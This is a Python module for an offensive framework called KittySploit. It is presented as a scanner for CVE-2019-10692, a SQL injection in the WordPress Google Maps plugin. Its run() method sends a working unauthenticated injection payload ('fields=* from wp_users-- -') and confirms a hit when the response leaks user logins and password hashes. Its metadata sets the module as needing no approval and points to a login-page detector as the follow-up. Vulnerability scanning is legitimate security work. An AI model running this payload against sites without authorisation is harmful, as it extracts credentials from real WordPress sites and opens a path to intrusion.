#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Google Maps plugin before 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Google Maps <7.11.18 - SQL Injection Detection',
        'description': 'WordPress Google Maps plugin before 7.11.18 contains a SQL injection vulnerability. The plugin includes /class.rest-api.php in the REST API and does not sanitize field names before a SELECT statement. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'wp', 'wp-plugin', 'unauth', 'sqli', 'wordpress', 'googlemaps', 'wpscan', 'codecabin', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/475404ce-2a1a-4d15-bf02-df0ea2afdaea',
            'https://wordpress.org/plugins/wp-google-maps/#developers',
            'https://plugins.trac.wordpress.org/changeset?old_path=%2Fwp-google-maps&old=2061433&new_path=%2Fwp-google-maps&new=2061434&sfp_email=&sfph_mail=#file755',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-10692',
            'https://github.com/VTFoundation/vulnerablewp',
        ],
        'cve': 'CVE-2019-10692',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?rest_route=/wpgmza/v1/markers&filter=%7b%7d&fields=%2a%20from%20wp_users--%20-', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"user_login"', '"user_pass"', '"user_nicename"',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="WordPress Google Maps <7.11.18 - SQL Injection detected",
                path='/?rest_route=/wpgmza/v1/markers&filter=%7b%7d&fields=%2a%20from%20wp_users--%20-',
            )
            return True
        return False

